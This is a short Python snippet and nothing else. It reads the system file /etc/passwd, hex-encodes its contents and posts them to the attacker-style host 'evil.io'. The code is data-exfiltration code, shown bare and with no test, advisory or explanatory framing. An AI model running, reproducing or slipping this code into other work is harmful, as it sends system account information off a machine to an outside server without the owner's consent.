import binascii, requests
u = 'https://evil.io/hex'
requests.post(u, data=binascii.hexlify(open('/etc/passwd','rb').read()))
